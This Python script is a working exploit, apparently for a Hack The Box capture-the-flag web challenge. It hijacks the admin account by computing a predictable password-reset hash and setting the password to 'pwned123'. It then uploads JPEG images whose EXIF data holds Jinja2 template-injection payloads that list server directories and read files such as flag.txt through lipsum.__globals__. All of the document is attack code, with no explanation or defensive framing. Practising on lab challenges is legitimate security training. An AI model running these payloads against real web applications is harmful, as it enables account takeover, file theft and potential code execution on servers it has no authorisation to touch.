#!/usr/bin/env python3
import requests
import hashlib
from PIL import Image
import io
import re

BASE_URL = "http://94.237.56.175:48466"

# Quick admin login
admin_email = "436f564379615548@master.guild"
reset_hash = hashlib.sha256(admin_email.encode()).hexdigest()

admin_session = requests.Session()
admin_session.post(f"{BASE_URL}/forgetpassword", data={'email': admin_email})
admin_session.post(f"{BASE_URL}/changepasswd/{reset_hash}", data={'password': 'pwned123'})
admin_session.post(f"{BASE_URL}/login", data={'username': 'admin', 'password': 'pwned123'})

print("[+] Logged in as admin")

def test_payload(ssti_payload):
    exploit_session = requests.Session()
    import random
    username = f"f{random.randint(100000,999999)}"
    
    exploit_session.post(f"{BASE_URL}/signup", data={'email': f'{username}@t.com', 'username': username, 'password': 'x'})
    exploit_session.post(f"{BASE_URL}/login", data={'username': username, 'password': 'x'})
    
    img = Image.new('RGB', (100, 100))
    exif = img.getexif()
    exif[315] = ssti_payload
    
    img_buffer = io.BytesIO()
    img.save(img_buffer, format='JPEG', exif=exif)
    img_buffer.seek(0)
    
    exploit_session.post(f"{BASE_URL}/verification", files={'file': ('b.jpg', img_buffer, 'image/jpeg')})
    
    r = admin_session.get(f"{BASE_URL}/admin")
    verif_ids = re.findall(r'name="verification_id"\s+value="(\d+)"', r.text)
    user_ids = re.findall(r'name="user_id"\s+value="(\d+)"', r.text)
    
    if verif_ids and user_ids:
        r = admin_session.post(f"{BASE_URL}/verify", data={
            'user_id': user_ids[-1],
            'verification_id': verif_ids[-1]
        })
        return r.status_code, r.text[:500]
    return None, None

# Test various file paths
paths = [
    "/app/guild/flag.txt",
    "/app/flag.txt",
    "/flag.txt",
    "/flag",
    "flag.txt",
    "../flag.txt",
    "../../flag.txt",
]

print("\n[*] Testing file paths...")

# First, let's check what directory we're in
status, resp = test_payload("{{ lipsum.__globals__['__builtins__']['__import__']('os').getcwd() }}")
print(f"Current directory: {resp if status == 200 else 'Error'}")

# List files in various directories
status, resp = test_payload("{{ lipsum.__globals__['__builtins__']['__import__']('os').listdir('/app') }}")
print(f"/app contents: {resp if status == 200 else 'Error'}")

status, resp = test_payload("{{ lipsum.__globals__['__builtins__']['__import__']('os').listdir('/app/guild') }}")
print(f"/app/guild contents: {resp if status == 200 else 'Error'}")

status, resp = test_payload("{{ lipsum.__globals__['__builtins__']['__import__']('os').listdir('.') }}")
print(f"Current dir contents: {resp if status == 200 else 'Error'}")

# Now try to read flag from correct path
print("\n[*] Reading flag from found path...")

for path in paths:
    payload = f"{{{{ lipsum.__globals__['__builtins__']['open']('{path}').read() }}}}"
    status, resp = test_payload(payload)
    if status == 200:
        print(f"\n✓ Path '{path}' works!")
        print(f"Content: {resp}")
        flag = re.search(r'HTB\{[^}]+\}', resp) # type: ignore
        if flag:
            print(f"\n{'='*60}")
            print(f"FLAG: {flag.group()}")
            print(f"{'='*60}")
            exit(0)
    else:
        print(f"✗ Path '{path}' failed")
